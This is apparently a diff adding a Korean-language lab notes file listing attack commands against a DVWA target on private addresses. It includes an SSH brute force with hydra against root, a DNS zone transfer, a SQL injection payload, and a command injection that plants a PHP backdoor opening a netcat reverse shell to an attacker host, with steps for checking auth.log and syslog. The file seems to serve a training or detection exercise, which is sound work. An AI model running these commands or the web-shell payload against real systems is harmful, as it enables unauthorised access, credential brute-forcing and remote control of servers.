@@ -1,0 +1,64 @@
+1번 시나리오 명령어들
+
+nmap -sV -p 22 10.4.0.3 #10.4.0.3로그
+tail -f /var/log/auth.log
+
+hydra -l root -P /root/test.txt 10.4.0.3 ssh
+tail -f /var/log/auth.log
+
+ssh root@10.4.0.3
+tail -f /var/log/auth.log
+
+
+dig axfr wj.com @172.16.18.28 # 172.16.18.28
+syslog
+
+whatweb dvwa.wj.com  #이거는 172.16.18.28
+
+
+칼리에서 dvwa.wj.com 접속
+172.16.18.28에서 확인
+
+sql인젝션에서
+' OR '1'='1' #
+
+커맨드인젝션에서
+클릭
+127.0.0.1 && echo """ <?php shell_exec('nc 10.4.0.4 4444 -e /bin/sh'); ?>""" > backdoor.php
+127.0.0.1 ; ls
+
+
+
+
+http://dvwa.wj.com/vulnerabilities/exec/backdoor.php 이건 로그 X
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
